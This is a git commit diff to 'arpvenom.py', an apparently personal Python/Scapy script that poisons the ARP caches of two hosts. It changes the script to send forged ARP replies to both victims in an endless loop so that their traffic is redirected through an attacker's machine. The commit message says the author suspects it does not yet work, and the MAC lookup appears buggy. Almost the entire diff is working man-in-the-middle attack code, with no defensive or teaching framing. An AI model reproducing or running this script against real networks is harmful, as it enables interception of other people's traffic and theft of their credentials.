246ac9b9884392c93d7cc6e1471f2e692031c886
rossfrombritain <ross123campbell@gmail.com>
2021-08-11 17:25:38 -0400

    improved the code and the MAC addresses are spoofed on the two targets but... don't think it's working

--- arpvenom.py
+++ arpvenom.py
@@ -12,43 +12,38 @@ def checkProc():
             print("Overwritten /proc/sys/net/ipv4/ip_forward val to 1")
 
 
-def poison(target, evilIP, gateway):
-    # pick up evil MAC address for later
-    getArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway, psrc=evilIP)
-    response = srp(getArp, timeout=3)
-    evilMac = response[0][0][1].hwsrc
+def getEvilMac(friend, evilIP):
+    getMac = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=friend, psrc=evilIP)
+    response = srp(getMac, timeout=3)
+    evilMac = response[0][0][1].hwdst
 
     if not evilMac:
         print(" [X] Couldn't pick up a MAC address to spoof for %s" % evilIP)
-        return
+    else:
+        return evilMac
 
-    # now send the gateway's details to the target
-    gatewaySpoof = ARP(op=2, psrc=target, pdst=gateway, hwsrc=evilMac)
 
-    # then trick the target
-    targetSpoof = ARP(op=2, psrc=gateway, pdst=target, hwsrc=evilMac)
-
-    return [gatewaySpoof, targetSpoof]
+def sendPoison(target, source, evilMac):
+    send(ARP(op=2, pdst=target, psrc=source, hwsrc=evilMac))
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Poison a target''s ARP cache with a given MAC address')
     parser.add_argument('-t', metavar='target', help='the target whose ARP cache we''re going for')
     parser.add_argument('-e', metavar='evil', help='the IP address we are spoofing traffic to')
-    parser.add_argument('-g', metavar='gateway', help='the gateway we are fooling')
+    parser.add_argument('-f', metavar='friend', help='the friend of the target')
 
-    checkProc()
+    # checkProc()
 
     args = parser.parse_args()
     target = args.t
-    evil = args.e
-    gateway = args.g
+    evilIP = args.e
+    friend = args.f
 
-    packets = poison(target, evil, gateway)
+    evilMac = getEvilMac(friend, evilIP)
+    print("the evil MAC address is: %s" % evilMac)
 
-    for pkt in packets:
-        #try:
-            rr = srp(pkt, timeout=2)
-            print(rr[0].show())
-        #except:
-            #print("failed to send packet")
+    while True:
+        sendPoison(target, friend, evilMac)
+        sendPoison(friend, target, evilMac)
+        time.sleep(1)
